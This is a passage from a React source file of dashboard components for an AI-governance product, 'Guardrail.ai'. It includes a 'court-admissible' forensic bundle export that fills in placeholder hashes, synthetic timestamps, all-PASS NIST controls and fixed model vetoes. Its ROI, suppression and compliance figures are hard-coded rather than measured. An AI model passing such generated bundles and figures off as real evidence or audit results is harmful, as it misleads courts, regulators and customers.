            <div className="absolute top-0 left-0 w-full h-1 bg-emerald-500/40 blur-sm shadow-[0_0_10px_#00ff88] animate-[scan_4s_ease-in-out_infinite]" />
        </div>
    );
};

export const RecoveryTimer = () => {
    return (
        <div className="p-12 glass-morphism brutalist-border flex flex-col gap-8">
            <div className="flex justify-between items-start">
                <div className="flex flex-col gap-2">
                    <h3 className="text-xl font-black italic tracking-tighter uppercase leading-none">Great Reset Recovery</h3>
                    <p className="text-[10px] opacity-60 uppercase tracking-widest text-emerald-400">Restoration from Sovereign Seed</p>
                </div>
                <div className="text-3xl font-black italic text-emerald-400">2:01</div>
            </div>

            {/* Progress Bar */}
            <div className="h-[2px] w-full bg-white/10 relative">
                <div className="absolute top-0 left-0 h-full w-[88%] bg-emerald-500 shadow-[0_0_10px_#00ff88]" />
            </div>

            <div className="flex justify-between items-center text-[10px] font-black uppercase italic">
                <span className="opacity-40">State: Restoring...</span>
                <span className="text-emerald-400">SLA: 15.00m (Passed)</span>
            </div>
        </div>
    );
};

// 14. Expert-Witness Export (New)
export const ExpertWitnessExport = () => {
    const [exporting, setExporting] = useState(false);
    const [exported, setExported] = useState(false);

    const handleExport = () => {
        if (exporting) return;
        setExporting(true);
        setExported(false);

        setTimeout(() => {
            const now = new Date();
            const bundle = {
                document: 'Guardrail.ai Legal Forensic Bundle',
                classification: 'COURT-ADMISSIBLE \u00b7 EU AI Act Art. 4a \u00b7 NIST-SP-800-REV3',
                generated: now.toISOString(),
                certificationChain: ['JUD-A01', 'JUD-A02', 'JUD-A03', 'JUD-A04'],
                pqcSignature: 'SPHINCS+::ROOT::STABLE_HASH_V1::WORM-ANCHORED',
                chainOfCustody: [
                    { step: 1, action: 'Agent Intent Capture', timestamp: now.toISOString(), hash: 'sha3::0x8d2f1...' },
                    { step: 2, action: 'OODA Intercept \u2014 Semantic Drift Detected', timestamp: new Date(now.getTime() + 4).toISOString(), hash: 'sha3::0x4e9a2...' },
                    { step: 3, action: 'Trinity Consensus VETO (3-of-3)', timestamp: new Date(now.getTime() + 8).toISOString(), hash: 'sha3::0x1b7c3...' },
                    { step: 4, action: 'Hard Block Issued \u2014 Circuit Breaker Tripped', timestamp: new Date(now.getTime() + 12).toISOString(), hash: 'sha3::0x9f5d4...' },
                    { step: 5, action: 'JUD-CERT Issued \u2014 WORM Archive Written', timestamp: new Date(now.getTime() + 16).toISOString(), hash: 'sha3::0x2a8e5...' },
                ],
                oodaDeconstruction: {
                    totalLatency: '2.1ms',
                    observe: { duration: '0.4ms', finding: 'Covert tool-call: transfer_funds($4.2M, offshore_acct)' },
                    orient: { duration: '0.4ms', finding: 'ASI06 \u2014 Covert Intent Misalignment, drift_score: 0.91' },
                    decide: { duration: '0.4ms', finding: 'Trinity Consensus VETO. Gemini=VETO, Llama=VETO, Claude=VETO' },
                    act: { duration: '0.9ms', finding: 'Constitutional lock engaged. EFI signature verified. Liability: $0.' },
                },
                nistControls: [
                    { id: 'GOVERN-1.1', status: 'PASS', evidence: 'EFI-locked Sovereign Constitution \u00b7 SPHINCS+-signed' },
                    { id: 'MAP-1.5', status: 'PASS', evidence: 'Real-time intent classification via Trinity veto protocol' },
                    { id: 'MEASURE-2.5', status: 'PASS', evidence: 'OODA P99 latency: 2.1ms \u00b7 100% intercept rate (CD-24)' },
                    { id: 'MANAGE-1.3', status: 'PASS', evidence: '$14.8M liability buffer \u2014 Chaos Drill 24 validated' },
                    { id: 'MANAGE-4.1', status: 'PASS', evidence: 'WORM archive \u2014 12-month immutable log, SHA3-PQC signed' },
                    { id: 'GOVERN-6.2', status: 'PASS', evidence: '2-Natural-Person liveness \u2014 Level 0 constitutional amendments' },
                ],
                judicialNote: 'This bundle is generated by the Guardrail.ai Sovereign Trust Engine and is suitable for judicial discovery, regulatory inspection, and board-level liability reporting. All entries are immutable, SPHINCS+-signed, and anchored to the WORM audit ledger.',
            };
            const blob = new Blob([JSON.stringify(bundle, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'Guardrail_Legal_Forensic_Bundle_' + now.toISOString().slice(0, 10) + '.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            setExporting(false);
            setExported(true);
            setTimeout(() => setExported(false), 4000);
        }, 1800);
    };

    return (
        <div className="flex flex-col gap-8 p-12 glass-morphism brutalist-border border-white/40">
            <div className="flex flex-col gap-4">
                <h3 className="text-xl font-black italic tracking-tighter uppercase leading-none text-emerald-400">Forensic Expert Manifest</h3>
                <p className="text-sm opacity-60">
                    Generate court-admissible forensic proofs with full OODA deconstruction and Lattice provenance.
                </p>
            </div>
            <button
                onClick={handleExport}
                disabled={exporting}
                className={'w-full py-6 font-black uppercase text-xs transition-all flex items-center justify-center gap-4 ' + (exporting ? 'bg-emerald-500 text-black cursor-wait' : exported ? 'bg-emerald-600 text-black' : 'bg-white text-black hover:bg-emerald-400')}
            >
                {exporting ? (
                    <>
                        <div className="w-4 h-4 border-2 border-black border-t-transparent animate-spin" />
                        GENERATING JUDICIAL CERTIFICATE...
                    </>
                ) : exported ? (
                    <>\u2713 FORENSIC BUNDLE DOWNLOADED</>
                ) : (
                    'EXPORT LEGAL FORENSIC BUNDLE [SHA3-PQC]'
                )}
            </button>
            {exported && (
                <div className="p-4 border border-emerald-500/30 bg-emerald-500/5 text-emerald-400 font-mono text-[9px] animate-in fade-in duration-500">
                    \u2713 Download complete: Guardrail_Legal_Forensic_Bundle.json<br />
                    Contains: OODA deconstruction \u00b7 JUD-CERT chain \u00b7 6 NIST controls \u00b7 SPHINCS+ signature \u00b7 chain-of-custody log
                </div>
            )}
            <div className="flex justify-between items-center text-[9px] font-black uppercase tracking-[0.2em] opacity-30">
                <span>Compliance: EU AI Act Art. 4a</span>
                <span>Format: NIST-SP-800-REV3</span>
            </div>
        </div>
    );
};

// 15. EDOS Suppression Loop (Phase 57 â†’ upgraded Phase 59)
export const EDOSSuppressionLoop = ({ onGoToROI }: { onGoToROI?: () => void } = {}) => {
    const [view, setView] = useState<'burn' | 'yield'>('yield');
    const isBurn = view === 'burn';

    return (
        <div className={`p-12 glass-morphism brutalist-border relative overflow-hidden flex flex-col items-center justify-center min-h-[350px] transition-all duration-700 ${isBurn ? 'bg-gradient-to-br from-black to-[#1a0000]' : 'bg-gradient-to-br from-black to-[#001a09]'}`}>
            {/* Noise texture */}
            <div className="absolute inset-0 opacity-[0.04] pointer-events-none font-mono text-[7px] leading-tight select-none">
                {Array(50).fill(isBurn ? "ADVERSARIAL_LOAD_DETECTED_SUPPRESSING_BURN_LOOP_" : "GOVERNANCE_YIELD_SOVEREIGN_SIGNAL_ACTIVE_VETO_").join(" ")}
            </div>

            {/* Emergency / Economic Toggle */}
            <div className="absolute top-4 right-4 flex items-center gap-1 z-20">
                <button
                    onClick={() => setView('burn')}
                    className={`text-[8px] font-black uppercase px-3 py-1.5 transition-all border ${isBurn ? 'bg-red-600 text-white border-red-500 shadow-[2px_2px_0_#000]' : 'bg-transparent text-red-500/50 border-red-500/20 hover:border-red-500/50'}`}
                >
                    âš¡ BURN
                </button>
                <button
                    onClick={() => setView('yield')}
                    className={`text-[8px] font-black uppercase px-3 py-1.5 transition-all border ${!isBurn ? 'bg-emerald-600 text-black border-emerald-500 shadow-[2px_2px_0_#000]' : 'bg-transparent text-emerald-500/50 border-emerald-500/20 hover:border-emerald-500/50'}`}
                >
                    â—† YIELD
                </button>
            </div>

            {/* Concentric Rings */}
            <div className="relative w-48 h-48">
                {/* Outer Ring */}
                <div className={`absolute inset-0 rounded-full border-4 animate-[spin_8s_linear_infinite] transition-colors duration-700 ${isBurn ? 'border-red-500/20' : 'border-emerald-500/10'}`} />
                <div className={`absolute inset-0 rounded-full border-t-4 animate-[spin_3s_linear_infinite] transition-colors duration-700 ${isBurn ? 'border-red-500' : 'border-emerald-400/30'}`} />

                {/* Inner Ring */}
                <div className={`absolute inset-4 rounded-full border-2 animate-[spin_12s_linear_reverse_infinite] transition-colors duration-700 ${isBurn ? 'border-red-500/10' : 'border-emerald-500/30'}`} />
                <div className={`absolute inset-4 rounded-full border-b-2 animate-[spin_5s_linear_reverse_infinite] transition-colors duration-700 ${isBurn ? 'border-red-400/40' : 'border-emerald-400'}`} />

                {/* Center Core */}
                <div className={`absolute inset-12 rounded-full flex items-center justify-center backdrop-blur-md border transition-all duration-700 ${isBurn ? 'bg-red-500/20 border-red-500/50' : 'bg-emerald-500/20 border-emerald-500/50'}`}>
                    <span className={`font-black text-xs transition-colors duration-300 ${isBurn ? 'text-red-400' : 'text-emerald-400'}`}>
                        {isBurn ? 'BURN' : 'VETO'}
                    </span>
                </div>
            </div>

            {/* Stats Panel */}
            <div className="grid grid-cols-2 gap-12 w-full mt-12 relative z-10">
                {isBurn ? (
                    <>
                        <div className="flex flex-col gap-1 border-l border-red-500/50 pl-4">
                            <span className="text-[10px] uppercase font-black opacity-40">Adversarial Load</span>
                            <span className="text-lg font-black italic text-red-500">1.4 TB/s pruned</span>
                            <span className="text-[9px] font-mono opacity-30">$0.003 / audit cycle</span>
                        </div>
                        <div className="flex flex-col gap-1 border-l border-red-500/30 pl-4">
                            <span className="text-[10px] uppercase font-black opacity-40">Suppression Rate</span>
                            <span className="text-lg font-black italic text-red-500">99.999%</span>
                            <span className="text-[9px] font-mono opacity-30">BYZANTINE-L3 ACTIVE</span>
                        </div>
                    </>
                ) : (
                    <>
                        <div className="flex flex-col gap-1 border-l border-emerald-500/50 pl-4">
                            <span className="text-[10px] uppercase font-black opacity-40">Governance Yield</span>
                            <span className="text-lg font-black italic text-emerald-400">99.98% ROI</span>
                            <span className="text-[9px] font-mono opacity-30">$14.8M buffer active</span>
                        </div>
                        <div className="flex flex-col gap-1 border-l border-emerald-500/30 pl-4">
                            <span className="text-[10px] uppercase font-black opacity-40">Liability Saved</span>
                            <span className="text-lg font-black italic text-emerald-400">âˆž Protected</span>
                            <span className="text-[9px] font-mono opacity-30">CD-24 verified</span>
                        </div>
                    </>
                )}
            </div>

            {/* ROI Calculator Link (Yield View only) */}
            {!isBurn && onGoToROI && (
                <button
                    onClick={onGoToROI}
                    className="mt-6 text-[9px] font-black uppercase text-emerald-400 border border-emerald-500/30 px-4 py-2 hover:bg-emerald-500/10 transition-all animate-in fade-in duration-500"
                >
                    â†’ Calculate Your Specific Savings on Page 02
                </button>
            )}
        </div>
    );
};


// 16. SLA Collision Resolver (Phase 57)
export const SLACallisionResolver = () => {
    const collisions = [
        { name: "Compliance vs. Latency", status: "Deterministic Resolution", win: "Compliance (Global Ingestor)" },
        { name: "Privacy vs. Audit", status: "ZKP Finality", win: "Locked Heritage" },
        { name: "Yield vs. Burn", status: "Economic Veto", win: "Sovereign Buffer" }
    ];

    return (
        <div className="flex flex-col gap-8 p-10 glass-morphism brutalist-border h-full">
            <div className="flex flex-col gap-4">
                <p className="text-[10px] font-mono opacity-50 italic">&gt; COLLISION_DETECTED: [0x882_SLA_CONFLICT]</p>
                <p className="text-xs font-bold text-emerald-400 uppercase tracking-widest">Resolving Multi-Agentic Directives</p>
            </div>

            <div className="flex flex-col gap-6">
                {collisions.map((c, i) => (
                    <div key={i} className="flex flex-col gap-3 p-4 bg-white/5 border border-white/10 group hover:border-emerald-500/50 transition-all">
                        <div className="flex justify-between items-center">
                            <span className="text-sm font-black italic uppercase">{c.name}</span>
                            <span className="text-[8px] font-mono text-emerald-400 animate-pulse">{c.status}</span>
                        </div>
                        <div className="flex items-center gap-4">
                            <div className="h-1 flex-1 bg-white/10 relative overflow-hidden">
                                <div className="absolute inset-y-0 left-0 bg-emerald-500 w-[100%] transition-all duration-1000 group-hover:bg-emerald-400" />
                            </div>
                            <span className="text-[9px] font-black uppercase text-emerald-400">{c.win}</span>
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
};

// 17. Multimodal Vibe Monitor (Phase 57)
const VIBE_BARS = Array.from({ length: 30 }, (_, i) => ({
    height: 20 + (Math.sin(i * 0.5) + 1) * 30, // Deterministic sin wave
    duration: (1 + (i % 5) * 0.2).toFixed(2),
}));

export const MultimodalVibeMonitor = () => {
    return (
        <div className="p-12 glass-morphism brutalist-border relative flex flex-col gap-8 h-full bg-gradient-to-br from-black to-[#05110a]">
            <div className="flex justify-between items-center">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400 opacity-70">Semantic Alignment Flow</h3>
                <div className="flex gap-2">
                    <div className="h-1 w-4 bg-emerald-500 animate-pulse" />
                    <div className="h-1 w-4 bg-emerald-500/30" />
                    <div className="h-1 w-4 bg-emerald-500/30" />
                </div>
            </div>

            <div className="flex-1 min-h-[150px] relative flex items-center justify-center overflow-hidden">
                {/* Waveform Visualization */}
                <div className="absolute inset-0 flex items-center justify-around opacity-40">
                    {VIBE_BARS.map((bar, i) => (
                        <div
                            key={i}
                            className="w-1 bg-emerald-500/50"
                            style={{
                                height: `${bar.height}%`,
                                transition: 'height 0.2s ease-in-out',
                                animation: `vibe-pulse ${bar.duration}s infinite alternate`
                            }}
                        />
                    ))}
                </div>
                <div className="relative z-10 text-[10px] font-black uppercase tracking-widest italic bg-black/60 px-4 py-2 border border-emerald-500/30 backdrop-blur-sm">
                    NO_BIAS_DETECTED [SEMANTIC_MATCH: 0.992]
                </div>
            </div>

            <div className="pt-8 border-t border-white/10 flex justify-between items-end">
                <div className="flex flex-col gap-1">
                    <span className="text-[9px] font-black opacity-30 uppercase tracking-widest">Modal Input</span>
                    <span className="text-xs font-bold">Text-to-Action Validation</span>
                </div>
                <div className="flex flex-col gap-1 items-end">
                    <span className="text-[9px] font-black opacity-30 uppercase tracking-widest">Drift Score</span>
                    <span className="text-xs font-bold text-emerald-400 italic">SUB-ZERO CYCLE</span>
                </div>
            </div>

            <style jsx>{`
                @keyframes vibe-pulse {
                    from { opacity: 0.3; transform: scaleY(0.8); }
                    to { opacity: 0.8; transform: scaleY(1.2); }
                }
            `}</style>
        </div>
    );
};

// 18. Worm-Security Tactical Heatmap (Phase 57)
export const WormSecurityHeatmap = () => {
    return (
        <div className="p-12 glass-morphism brutalist-border relative flex flex-col gap-10 overflow-hidden bg-black group">
            <div className="flex justify-between items-start z-10">
                <div className="flex flex-col gap-2">
                    <h3 className="text-xl font-black italic tracking-tighter uppercase leading-none">Worm-Containment Grid</h3>
                    <p className="text-[10px] opacity-60 uppercase tracking-widest text-emerald-400">Autonomous Shell-Code Isolation</p>
                </div>
                <div className="text-[9px] font-black px-2 py-1 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                    ACTIVE_NEUTRALIZATION
                </div>
            </div>

            <div className="grid grid-cols-8 gap-2 relative z-10">
                {[...Array(32)].map((_, i) => {
                    const isHot = i === 12 || i === 13 || i === 20;
                    return (
                        <div
                            key={i}
                            className={`aspect-square brutalist-border transition-all duration-300 ${isHot ? 'bg-emerald-500/40 border-emerald-500 shadow-[0_0_15px_rgba(0,255,136,0.2)] animate-pulse' : 'bg-white/5 border-white/5 opacity-50 hover:bg-white/10'}`}
                        />
                    );
                })}
            </div>

            <div className="flex flex-col gap-4 relative z-10 text-[10px] font-mono p-4 bg-white/5 border-l-2 border-emerald-500">
                <div className="flex justify-between">
                    <span className="opacity-40">ATTACK_VECTOR:</span>
                    <span className="text-red-500 font-bold italic underline">Logic_Poisoning_V3</span>
                </div>
                <div className="flex justify-between">
                    <span className="opacity-40">RESOLUTION:</span>
                    <span className="text-emerald-400 font-bold">BYZANTINE_SNAPSHOT_RESTORED</span>
                </div>
            </div>

            {/* Tactical Grid Overlay */}
            <div className="absolute inset-0 opacity-[0.02] bg-[radial-gradient(#fff_1px,transparent_1px)] [background-size:20px_20px] pointer-events-none" />
        </div>
    );
};

// â”€â”€â”€ PHASE 58 COMPONENTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// P0 â€” Pillar 1: AaaP Lead-Gen â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// 19. Audit Intensity Selector
export const AuditIntensitySelector = ({ onDepthChange }: { onDepthChange: (depth: number) => void }) => {
    const [depth, setDepth] = useState(1);
    const labels = ['Standard-Grade', 'Enhanced (2-of-3)', 'Financial-Grade (3-of-3)'];
    const colors = ['border-white/40 text-white', 'border-blue-400 text-blue-400', 'border-emerald-400 text-emerald-400'];

    const handleChange = (v: number) => {
        setDepth(v);
        onDepthChange(v);
    };

    return (
        <div className="flex flex-col gap-8 p-10 glass-morphism brutalist-border">
            <div className="flex flex-col gap-2">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Audit Depth Selector</h3>
                <p className="text-[10px] opacity-50">Drag to configure real-time audit intensity and governance coverage.</p>
            </div>
            <input
                type="range" min={0} max={2} step={1} value={depth}
                onChange={(e) => handleChange(Number(e.target.value))}
                className="w-full accent-emerald-400 cursor-pointer"
            />
            <div className="flex justify-between">
                {labels.map((l, i) => (
                    <span key={i} className={`text-[9px] font-black uppercase tracking-widest border-b-2 pb-1 transition-all ${depth === i ? colors[i] : 'border-transparent opacity-20'}`}>{l}</span>
                ))}
            </div>
            <div className={`p-6 border transition-all duration-500 text-[10px] font-mono italic ${depth === 2 ? 'border-emerald-500/50 bg-emerald-500/5 text-emerald-400' : depth === 1 ? 'border-blue-500/30 bg-blue-500/5 text-blue-400' : 'border-white/10 bg-white/5 opacity-60'}`}>
                {depth === 0 && '> AUDIT_MODE: STANDARD â€” Single auditor, 500ms latency. Suitable for low-risk ops.'}
                {depth === 1 && '> AUDIT_MODE: ENHANCED â€” 2-of-3 Trinity consensus. Cross-validated, 850ms latency.'}
                {depth === 2 && '> AUDIT_MODE: FINANCIAL_GRADE â€” 3-of-3 unanimous. Zero-cycle veto. Full OODA replay. $14.8M buffer active.'}
            </div>
        </div>
    );
};

// 20. Live ROI Calculator (Legacy removed)

// P1 â€” Pillar 5: War-Room Expansion â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// 21. Sovereign Whisper Monitor
const WHISPER_BARS = Array.from({ length: 30 }, (_, i) => ({
    baseHeight: Math.floor(20 + (Math.sin(i * 0.8) + 1) * 30),
    duration: (0.8 + (i % 5) * 0.2).toFixed(1),
}));

export const SovereignWhisperMonitor = () => {
    const [agitation, setAgitation] = useState(32);

    return (
        <div className="flex flex-col gap-8 p-10 glass-morphism brutalist-border relative overflow-hidden">
            <div className="flex justify-between items-start">
                <div className="flex flex-col gap-2">
                    <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Sovereign Whisper Monitor</h3>
                    <p className="text-[10px] opacity-50">Collective agitation index across 100,000-agent mesh. Threshold: 65%.</p>
                </div>
                <div className={`text-sm font-black italic ${agitation > 65 ? 'text-red-500' : agitation > 40 ? 'text-amber-400' : 'text-emerald-400'}`}>
                    {agitation}% AGITATION
                </div>
            </div>
            <div className="relative h-32 flex items-end justify-around gap-0.5">
                {/* Threshold Line */}
                <div className="absolute left-0 right-0 border-t border-dashed border-red-500/40" style={{ top: '35%' }}>
                    <span className="absolute right-0 -top-4 text-[8px] font-black text-red-500/60 uppercase">BREACH THRESHOLD</span>
                </div>
                {WHISPER_BARS.map((bar, i) => {
                    const h = Math.min(100, bar.baseHeight + agitation * 0.4);
                    const color = h > 65 ? 'bg-red-500' : h > 45 ? 'bg-amber-400' : 'bg-emerald-500';
                    return (
                        <div key={i} className={`flex-1 ${color} opacity-70 transition-all duration-300`} style={{ height: `${h}%`, animationDuration: `${bar.duration}s` }} />
                    );
                })}
            </div>
            <div className="flex items-center gap-4">
                <span className="text-[10px] font-black opacity-40 uppercase w-24">Agitation: {agitation}%</span>
                <input type="range" min={5} max={95} value={agitation} onChange={e => setAgitation(Number(e.target.value))} className="flex-1 accent-emerald-400 cursor-pointer" />
            </div>
        </div>
    );
};

// P1 â€” Pillar 3: Day-Zero Sandbox â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// 22. Global Compliance Map (Phase 59 â€” adherence scores + circular rings)
export const GlobalComplianceMap = () => {
    const [selected, setSelected] = useState<string | null>(null);
    const nodes = [
        {
            id: 'mumbai', label: 'MUMBAI', mandate: 'DPDP-2026', status: 'HEALTHY',
            cx: '72%', cy: '52%', color: 'bg-emerald-500 shadow-[0_0_12px_#00ff88]',
            mandates: [
                { name: 'DPDP-2026', score: 99.2 },
                { name: 'RBI-AI-GOV', score: 100 },
                { name: 'SEBI-ALGO', score: 96.7 },
            ]
        },
        {
            id: 'frankfurt', label: 'FRANKFURT', mandate: 'EU AI ACT V2', status: 'STRICT',
            cx: '48%', cy: '30%', color: 'bg-blue-400 shadow-[0_0_12px_#60a5fa]',
            mandates: [
                { name: 'EU AI ACT V2', score: 97.8 },
                { name: 'GDPR-AGENTIC', score: 100 },
                { name: 'BaFin-2025', score: 94.1 },
            ]
        },
        {
            id: 'us', label: 'US-EAST', mandate: 'SEC-800-REV3', status: 'HEALTHY',
            cx: '22%', cy: '38%', color: 'bg-emerald-500 shadow-[0_0_12px_#00ff88]',
            mandates: [
                { name: 'SEC-800-REV3', score: 100 },
                { name: 'NIST-AI-RMF', score: 98.5 },
                { name: 'SOC2-TYPE2', score: 100 },
            ]
        },
    ];
    const active = nodes.find(n => n.id === selected);

    const CircleRing = ({ score, name }: { score: number; name: string }) => {
        const r = 20;
        const circ = 2 * Math.PI * r;
        const dash = (score / 100) * circ;
        const isPending = score < 100;
        return (
            <div className="flex flex-col items-center gap-2">
                <div className="relative w-12 h-12">
                    <svg className="w-full h-full -rotate-90" viewBox="0 0 48 48">
                        <circle cx="24" cy="24" r={r} fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="4" />
                        <circle
                            cx="24" cy="24" r={r} fill="none"
                            stroke={isPending ? '#f59e0b' : '#00ff88'}
                            strokeWidth="4"
                            strokeDasharray={`${dash} ${circ}`}
                            strokeLinecap="round"
                            className="transition-all duration-1000"
                        />
                    </svg>
                    <span className={`absolute inset-0 flex items-center justify-center text-[8px] font-black ${isPending ? 'text-amber-400' : 'text-emerald-400'}`}>
                        {score}%
                    </span>
                </div>
                <span className="text-[7px] font-black uppercase opacity-40 text-center leading-tight">{name}</span>
                {isPending && (
                    <span className="text-[6px] font-black uppercase px-1 py-0.5 bg-amber-500/20 text-amber-400 border border-amber-500/30 text-center leading-tight">
                        âŸ³ Shadow<br />Amendment
                    </span>
                )}
            </div>
        );
    };

    return (
        <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border">
            <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Global Compliance Map</h3>
            <div className="relative w-full aspect-[2/1] bg-black/60 border border-white/5 overflow-hidden">
                {/* SVG World Map Outline */}
                <svg className="absolute inset-0 w-full h-full opacity-10" viewBox="0 0 800 400" fill="none">
                    <path d="M80,120 Q160,80 200,130 Q240,150 280,120 Q320,90 360,110 Q400,130 440,100 Q500,70 560,90 Q620,110 680,130 Q720,150 740,180 Q760,220 740,260 Q720,300 680,310 Q620,330 560,320 Q500,340 440,320 Q400,310 360,330 Q320,350 280,330 Q240,310 200,340 Q160,360 120,330 Q80,300 80,260 Q60,220 80,180 Z" stroke="white" strokeWidth="1" fill="white" fillOpacity="0.05" />
                    <path d="M120,150 Q140,140 160,155 Q180,170 160,185 Q140,200 120,185 Z" stroke="white" strokeWidth="1" />
                    <path d="M400,200 Q440,190 480,210 Q460,240 420,250 Q380,240 400,200 Z" stroke="white" strokeWidth="1" />
                </svg>
                {/* Node Dots */}
                {nodes.map(n => (
                    <button
                        key={n.id}
                        onClick={() => setSelected(selected === n.id ? null : n.id)}
                        className={`absolute w-4 h-4 rounded-full ${n.color} animate-pulse -translate-x-1/2 -translate-y-1/2 hover:scale-150 transition-transform`}
                        style={{ left: n.cx, top: n.cy }}
                        title={n.label}
                    />
                ))}
                {nodes.map(n => (
                    <span key={n.id + 'l'} className="absolute text-[8px] font-black uppercase opacity-40" style={{ left: n.cx, top: `calc(${n.cy} + 14px)`, transform: 'translateX(-50%)' }}>{n.label}</span>
                ))}
            </div>

            {/* Expanded Node Card with Adherence Rings */}
            {active && (
                <div className="p-6 border border-emerald-500/30 bg-emerald-500/5 animate-in slide-in-from-top-4 duration-500 flex flex-col gap-6">
                    <div className="flex justify-between items-center">
                        <div className="flex flex-col gap-1">
                            <span className="text-xs font-black uppercase">{active.label} â€” {active.mandate}</span>
                            <span className="text-[9px] opacity-50 font-mono">CLUSTER_HEALTH: 100% Â· CONSENSUS: BYZANTINE-L3 Â· LATENCY: &lt;12ms</span>
                        </div>
                        <span className={`text-[9px] font-black px-2 py-1 ${active.status === 'STRICT' ? 'bg-blue-500/20 text-blue-400' : 'bg-emerald-500/20 text-emerald-400'}`}>{active.status}</span>
                    </div>
                    {/* Circular Adherence Rings */}
                    <div className="flex gap-6 justify-around pt-2 border-t border-white/10">
                        {active.mandates.map((m, i) => (
                            <CircleRing key={i} score={m.score} name={m.name} />
                        ))}
                    </div>
                    {active.mandates.some(m => m.score < 100) && (
                        <p className="text-[8px] font-mono italic opacity-40 text-center">
                            âŸ³ Regulatory Ingestor is autonomously drafting Shadow Amendments for sub-100% mandates
                        </p>
                    )}
                </div>
            )}
        </div>
    );
};


// P2 â€” Pillar 2: Sovereign Seniority â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// Sovereign Seed Ledger data (module-level, no Math.random in render)
const SEED_MONTHS = ['Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec', 'Jan', 'Feb'];
const SEED_BARS = [12, 18, 22, 28, 35, 41, 49, 57, 68, 79, 91, 107]; // Lattice Credits accumulated
const TAKEOVER_COST = 1200; // simulated enterprise buyout cost in Lattice Credits

// 23. Stewardship Tax Ticker (Phase 59 â€” expands into SovereignSeedLedger)
export const StewardshipTaxTicker = () => {
    const [routed, setRouted] = useState(0.00000000);
    const [open, setOpen] = useState(false);
    const [tooltip, setTooltip] = useState<number | null>(null);

    useEffect(() => {
        const interval = setInterval(() => {
            setRouted(prev => +(prev + 0.00000001).toFixed(9));
        }, 400);
        return () => clearInterval(interval);
    }, []);

    const currentBalance = SEED_BARS[SEED_BARS.length - 1];
    const resistance = ((currentBalance / TAKEOVER_COST) * 100).toFixed(1);

    return (
        <div className="relative">
            {/* Ticker Button */}
            <button
                onClick={() => setOpen(o => !o)}
                className="flex items-center gap-3 border border-white/10 px-4 py-2 glass-morphism hover:border-emerald-500/30 transition-all"
            >
                <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                <div className="flex flex-col text-left">
                    <span className="text-[8px] font-black uppercase opacity-30 tracking-widest">Stewardship Tax</span>
                    <span className="text-[10px] font-mono text-emerald-400">0.001% â†’ SOVEREIGN_SEED Â· ${routed.toFixed(8)}</span>
                </div>
                <span className="text-[8px] font-black text-emerald-400/50 ml-1">{open ? 'â–²' : 'â–¼'}</span>
            </button>

            {/* SovereignSeedLedger Drop-Down */}
            {open && (
                <div className="absolute top-full right-0 mt-2 w-80 z-50 p-5 glass-morphism border border-emerald-500/30 bg-black/95 shadow-[0_8px_32px_rgba(0,255,136,0.1)] animate-in slide-in-from-top-2 duration-300">
                    {/* Header */}
                    <div className="flex items-center justify-between mb-4">
                        <div className="flex flex-col gap-0.5">
                            <div className="flex items-center gap-2">
                                <span className="text-[9px] font-black uppercase tracking-widest text-emerald-400">Sovereign Seed Ledger</span>
                                {/* SPHINCS+ Founder-Locked Icon */}
                                <span className="text-[7px] font-black px-1.5 py-0.5 border border-emerald-500/40 text-emerald-400/60 uppercase">â¬¡ SPHINCS+</span>
                            </div>
                            <span className="text-[7px] font-mono opacity-30">FOUNDER-LOCKED Â· PQC-SIGNED Â· NO-TAKEOVER-POSSIBLE</span>
                        </div>
                        <div className="flex flex-col items-end">
                            <span className="text-sm font-black italic text-emerald-400">{currentBalance} LC</span>
                            <span className="text-[7px] font-mono opacity-40">Lattice Credits</span>
                        </div>
                    </div>

                    {/* Brutalist Stepped Sparkline */}
                    <div className="relative h-20 flex items-end gap-[2px] mb-3">
                        {SEED_BARS.map((val, i) => {
                            const h = (val / Math.max(...SEED_BARS)) * 100;
                            const takeover = ((val / TAKEOVER_COST) * 100).toFixed(1);
                            return (
                                <div
                                    key={i}
                                    className="relative flex-1 group cursor-pointer"
                                    style={{ height: `${h}%` }}
                                    onMouseEnter={() => setTooltip(i)}
                                    onMouseLeave={() => setTooltip(null)}
                                >
                                    {/* Stepped bar (brutalist â€” no rounded corners) */}
                                    <div className="absolute inset-0 bg-emerald-500 opacity-70 group-hover:opacity-100 transition-opacity" style={{ imageRendering: 'pixelated' }} />
                                    {/* Tooltip */}
                                    {tooltip === i && (
